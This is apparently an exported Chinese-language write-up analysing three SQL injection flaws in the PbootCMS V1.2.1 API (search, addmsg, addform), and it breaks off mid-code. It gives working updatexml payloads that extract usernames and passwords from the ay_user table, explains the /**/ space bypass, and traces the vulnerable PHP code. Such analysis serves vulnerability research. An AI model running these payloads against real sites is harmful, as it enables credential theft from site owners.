			<a name="X5abe9724886b331a02954b8b7181d5eb39e6d2b"><span class="csB2D98684">0x10 api</span><span class="cs83F14626">模块注入</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">api</span><span class="cs9C1B1871">模块的注入需要后端开启</span><span class="cs8926E06">api</span><span class="cs9C1B1871">功能，并且获得</span><span class="cs8926E06"> api_appid </span><span class="cs9C1B1871">与</span><span class="cs8926E06"> api_secret </span><span class="cs9C1B1871">才能注入。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">或是说</span><span class="cs8926E06"> </span><span class="cs9C1B1871">开启了</span><span class="cs8926E06">api</span><span class="cs9C1B1871">功能并且关闭了</span><span class="cs8926E06">API</span><span class="cs9C1B1871">强制认证</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这样也可以注入</span><span class="cs8926E06"> </span><span class="cs9C1B1871">所以较鸡助</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image0.jpg" width="560" height="359" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="Xb83086fdcc3fff2f59d5d52261ef57b9fe681b4"><span class="csB2D98684">0x10.1 </span><span class="cs83F14626">接口注入一</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X21037fff23f59ab48b0ee0b7e9bc48f94a4d03d"><span class="csD1E291E2">0x10.1.1 </span><span class="csD6CA00D2">漏洞演示</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">url:http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;11=11</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">一定要</span><span class="cs8926E06">post </span><span class="cs9C1B1871">要跑空</span><span class="cs8926E06">post</span><span class="cs9C1B1871">才能进流程</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为系统中会把</span><span class="cs8926E06"> &ldquo;</span><span class="cs9C1B1871">空格</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">转为</span><span class="cs8926E06">&ldquo;_&rdquo; </span><span class="cs9C1B1871">所以使用</span><span class="cs8926E06">/**/</span><span class="cs9C1B1871">绕过即可</span></p><h3 class="cs868C439D">
			<a name="X15d92aab3e71d26a036b423c012e8dc7e5de473"><span class="csD1E291E2">0x10.1.2 </span><span class="csD6CA00D2">漏洞讲解</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">apps\api\controller\CmsController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">search( </span><span class="cs9C1B1871">这里我把漏洞触发点发出来我们主要讲讲他即可</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">数据接收</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">foreach ($_GET as $key =&gt; $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if (! ! $value = get($key, &#39;vars&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$where[$key] = $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$data = $this-&gt;model-&gt;getList($acode, $scode, $num, $order, $where, $fuzzy);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从代码中看他会收集外部所有的</span><span class="cs8926E06"> $_GET </span><span class="cs9C1B1871">带入</span><span class="cs8926E06"> getList </span><span class="cs9C1B1871">进行入库查询</span><span class="cs8926E06"> value </span><span class="cs9C1B1871">是我们无法控制所以无法注入的，可是</span><span class="cs8926E06">key</span><span class="cs9C1B1871">是我们可控制可注入的！！！跟进</span><span class="cs8926E06"> getList</span><span class="cs9C1B1871">方法</span><span class="cs8926E06"> </span><span class="cs9C1B1871">路径：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\api\model\CmsModel.php function getList(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">列表内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function getList($acode, $scode, $num, $order, $where = array(), $fuzzy = true)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">筛选条件支持模糊匹配</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parent::table(&#39;ay_content a&#39;)-&gt;field($fields)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where($where1, &#39;OR&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where($where2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where($where, &#39;AND&#39;, &#39;AND&#39;, $fuzzy)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;join($join)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;order($order)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;page(1, $num)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;decode()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;select();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里我把关键代码放出来了，可以看到接收</span><span class="cs8926E06">$where</span><span class="cs9C1B1871">以后直接仍进了数据库进行操作造成了注入</span></p><h2 class="cs868C439D">
			<a name="Xcaa095544fa654de9529ec1a7c428a5f612592a"><span class="csB2D98684">0x10.2 </span><span class="cs83F14626">接口注入二</span></a></h2>
		<h3 class="cs868C439D">
			<a name="Xd96563e9b34d99a3973dbbf088cfdad5d9be9bd"><span class="csD1E291E2">0x10.2.1 </span><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">url</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addmsg</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mobile = 111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;content = 111</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image10.png" width="560" height="223" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">0x10.2.2 </span><span class="cs9C1B1871">漏洞讲解</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文件：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\api\controller\CmsController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">addmsg(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">新增留言</span><span class="cs9FB05234"> &nbsp;&nbsp;</span><span class="cs7FFD2630">注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function addmsg()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($_POST) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取字段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $form = $this-&gt;model-&gt;getFormField(1)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">接收表单不存在任何字段，请核对后重试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">接收数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($form as $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($value-&gt;required &amp;&amp; ! $field_data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, $value-&gt;description . &#39;</span><span class="cs7FFD2630">不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[$value-&gt;name] = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= $value-&gt;description . &#39;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置其他字段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;acode&#39;] = get(&#39;acode&#39;, &#39;var&#39;) ?: $this-&gt;lg;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_ip&#39;] = ip2long(get_user_ip());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_os&#39;] = get_user_os();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_bs&#39;] = get_user_bs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;recontent&#39;] = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;status&#39;] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;create_user&#39;] = &#39;api&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;update_user&#39;] = &#39;api&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">写入数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;model-&gt;addMessage($value-&gt;table_name, $data)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;API</span><span class="cs7FFD2630">提交表单数据成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_subject = &quot;</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">PbootCMS</span><span class="cs7FFD2630">】您有新的表单数据，请注意查收！</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= &#39;&lt;br&gt;</span><span class="cs7FFD2630">来自网站</span><span class="cs9FB05234">&#39; . get_http_url() . &#39;</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(1, &#39;</span><span class="cs7FFD2630">表单提交成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;API</span><span class="cs7FFD2630">提交表单数据失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">表单提交失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">表单提交失败，请使用</span><span class="cs9FB05234">POST</span><span class="cs7FFD2630">方式提交！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">内容，只匹配数据库的字段，相同才会拼接到</span><span class="cs8926E06"> $_data</span><span class="cs9C1B1871">数组</span></p><p class="cs3A447A38"><span class="cs7FFD2630">然后就会带入</span><span class="cs9FB05234"> $this-&gt;model-&gt;addMessage(data) </span><span class="cs7FFD2630">执行语句</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\api\model\CmsModel.php </span><span class="cs9C1B1871">函数：</span><span class="cs8926E06">addMessage(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">新增留言</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function addMessage($table, $data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return parent::table(&#39;ay_message&#39;)-&gt;autoTime()-&gt;insert($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">6.0</span><span class="cs9C1B1871">可以看到带入了进入了</span><span class="cs8926E06"> insert </span><span class="cs9C1B1871">那么我们传的二维数组刚好可以控制</span><span class="cs8926E06">key </span><span class="cs9C1B1871">带入数据库查询引发注入</span></p><h2 class="cs868C439D">
			<a name="X0107ac81f524c03e6652b23d40507a611c87302"><span class="csB2D98684">0x10.3 </span><span class="cs83F14626">接口注入三</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X593e3b07328567989924738bb2d52ba2997dc78"><span class="csD1E291E2">0x10.3.1 </span><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">url</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://127.0.0.1/cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mobile = 111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;content = 123</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image11.png" width="560" height="172" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">0x10.3.2 </span><span class="cs9C1B1871">漏洞讲解</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">表单提交</span><span class="cs9FB05234"> &nbsp;</span><span class="cs7FFD2630">注入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function addform()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($_POST) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $fcode = get(&#39;fcode&#39;, &#39;var&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">传递的表单编码</span><span class="cs9FB05234">fcode</span><span class="cs7FFD2630">有误！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取字段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $form = $this-&gt;model-&gt;getFormField($fcode)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, &#39;</span><span class="cs7FFD2630">接收表单不存在任何字段，请核对后重试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">接收数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($form as $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($value-&gt;required &amp;&amp; ! $field_data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json(0, $value-&gt;description . &#39;</span><span class="cs7FFD2630">不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[$value-&gt;name] = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 